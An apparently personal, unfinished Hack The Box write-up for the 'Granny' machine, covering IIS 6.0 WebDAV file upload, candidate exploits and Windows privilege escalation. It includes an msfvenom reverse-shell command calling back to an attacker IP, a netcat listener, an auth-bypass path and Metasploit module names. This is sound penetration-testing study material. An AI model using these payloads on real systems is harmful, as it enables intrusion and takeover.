# Granny
`Still in progress`

## Recon

The tags on [this box](https://app.hackthebox.com/machines/14)  
> - Windows
> - Patch Management  
> - Web

Difficulty:
> Easy

The only open port is 80. There is an IIS 6.0 webserver running. The homepage appears to be broken:

![[Pasted image 20220115184455.png]]

IIS 6.0 is way old. There's gotta be exploits for it out there. I reviewed EDB exploits using searchsploit, but none of them seem exciting. I decided to check with [Hacktricks's WebDav page](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) and was happy to find the following method to gain code execution.

For the shell, I'll be using msfvenom to create a reverse tcp shell for windows.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f asp -o reverse.asp
```

![[Pasted image 20220115185937.png]]

Now start a listener to catch the reverse shell.

```bash
nc -nvlp 4444
```

Then trigger the exploit by visiting the malicious page we just uploaded.

![[Pasted image 20220115190110.png]]

Look, a shell!

![[Pasted image 20220115190203.png]]

System Info

```
> Host Name:                 GRANNY  
> OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition  
> OS Version:                5.2.3790 Service Pack 2 Build 3790  
> OS Manufacturer:           Microsoft Corporation  
> OS Configuration:          Standalone Server  
> OS Build Type:             Uniprocessor Free  
> Registered Owner:          HTB  
> Registered Organization:   HTB  
> Product ID:                69712-296-0024942-44782  
> Original Install Date:     4/12/2017, 5:07:40 PM  
> System Up Time:            0 Days, 0 Hours, 53 Minutes, 6 Seconds  
> System Manufacturer:       VMware, Inc.  
> System Model:              VMware Virtual Platform  
> System Type:               X86-based PC  
> Processor(s):              1 Processor(s) Installed.  
>   [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz  
> BIOS Version:              INTEL  - 6040000  
>  Windows Directory:         C:\WINDOWS  
> System Directory:          C:\WINDOWS\system32  
> Boot Device:               \Device\HarddiskVolume1  
> System Locale:             en-us;English (United States)  
> Input Locale:              en-us;English (United States)  
> Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk  
> Total Physical Memory:     1,023 MB  
> Available Physical Memory: 709 MB  
> Page File: Max Size:       2,470 MB  
> Page File: Available:      2,255 MB  
> Page File: In Use:         215 MB  
> Page File Location(s):     C:\pagefile.sys  
> Domain:                    HTB  
> Logon Server:              N/A  
> Hotfix(s):                 1 Hotfix(s) Installed.  
> [01]: Q147222  
> Network Card(s):           N/A 
```


## Privesc

I used the same technique to upload winpeas.bat to do some more enumeration.

Didn't see anything obvious in the WinPEAS output, so I took a break and added an analysis/lessons learned to the other pages. One of the mistakes I made was to jump to exploitation before finishing enumeration. Enumerate, enumerate, enumerate. I'm going to try a different format for writeups on the next few boxes, switching to that format now (sorry readers, this is going to be a messy writeup).



## NMAP scan results

```text
PORT   STATE SERVICE REASON          VERSION                                                                      80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0                                                      | http-methods:                                                                                                   |   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST                                                                                                                 |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT             |_http-title: Under Construction                                                                                  | http-webdav-scan:                                                                                               |   Server Date: Sun, 16 Jan 2022 00:28:36 GMT                                                                    |   WebDAV type: Unknown                                                                                          |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                                      |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK                                                                                                                |_  Server Type: Microsoft-IIS/6.0                                                                                |_http-server-header: Microsoft-IIS/6.0                                                                           Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port             Device type: general purpose                                                                                      Running (JUST GUESSING): Microsoft Windows 2003|2008|2000|XP (91%)

```

# Services

## :80 - IIS 6.0
From [Wikipedia](https://en.wikipedia.org/wiki/Internet_Information_Services)

> **Internet Information Services** (**IIS**, formerly **Internet Information Server**) is an extensible [web server](https://en.wikipedia.org/wiki/Web_server "Web server") software created by [Microsoft](https://en.wikipedia.org/wiki/Microsoft "Microsoft") for use with the [Windows NT](https://en.wikipedia.org/wiki/Windows_NT "Windows NT") family.[[2]](https://en.wikipedia.org/wiki/Internet_Information_Services#cite_note-2) IIS supports [HTTP](https://en.wikipedia.org/wiki/HTTP "HTTP"), [HTTP/2](https://en.wikipedia.org/wiki/HTTP/2 "HTTP/2"), [HTTPS](https://en.wikipedia.org/wiki/HTTPS "HTTPS"), [FTP](https://en.wikipedia.org/wiki/File_Transfer_Protocol "File Transfer Protocol"), [FTPS](https://en.wikipedia.org/wiki/FTPS "FTPS"), [SMTP](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol "Simple Mail Transfer Protocol") and [NNTP](https://en.wikipedia.org/wiki/Network_News_Transfer_Protocol "Network News Transfer Protocol"). It has been an integral part of the Windows NT family since [Windows NT 4.0](https://en.wikipedia.org/wiki/Windows_NT_4.0 "Windows NT 4.0"), though it may be absent from some editions (e.g. Windows XP Home edition), and is not active by default.

### Exploit 1 - WebDav arbitrary file upload
[HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) explains how to upload an executable file to bypass filtering. This is the method I already did above, and I was able to get a shell as `network service`


### Exploit 2 - WebDav buffer overflow
[EDB-41738](https://www.exploit-db.com/exploits/41738)
> Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.  

This exploit is pre-loaded with a calc.exe payload - if I want to exploit I'll need to replace the payload with a reverse shell or something similar.

#### Replacing the shellcode
![[Pasted image 20220116165456.png]]  

I couldn't get this one to work, I may be doing it wrong. This attack vector seems too complex for the rating of this box anyway.

### Exploit 3 - IIS 6.0 Authentication Bypass
[EDB-19033](https://www.exploit-db.com/exploits/19033)

> (tested on Windows Server 2003 SP1 running PHP5)  
Details:  
By sending a special request to the IIS 6.0 Service running PHP the attacker can successfully bypass access restrictions.  
>Take for example:  
1.) IIS/6.0 has PHP installed  
2.) There is a Password Protected directory configured  
--> An attacker can access PHP files in the password protected  
directory and execute them without supplying proper credentials.  
--> Example request (path to the file): /admin::$INDEX_ALLOCATION/index.php  
IIS/6.0 will gracefully load the PHP file inside the "admin" directory if the ::$INDEX_ALLOCATION postfix is appended to directory name.  
This can result in accessing administrative files and under special circumstances execute arbirary code remotely.

## Applications
From winpeas, I was able to see the following patches not installed. There were more missing patches, but these are ones I could find potentially relevant exploits for.

Since all the privilege escalation paths I found were metasploit modules, I had to migrate my shell over to metasploit:

![[Pasted image 20220116185502.png]]

### Task Scheduler
MS10-092 - [EDB - 19930] This is a metasploit module. I would need to migrate shell to metasploit session before testing `windows/local/ms10_092_schelevator`

#### Exploitation



### Kitripod
MS10-015 - [EDB - 11199](https://www.exploit-db.com/exploits/11199) This is also a metasploit module.
`windows/local/ms10_015_kitrap0d`


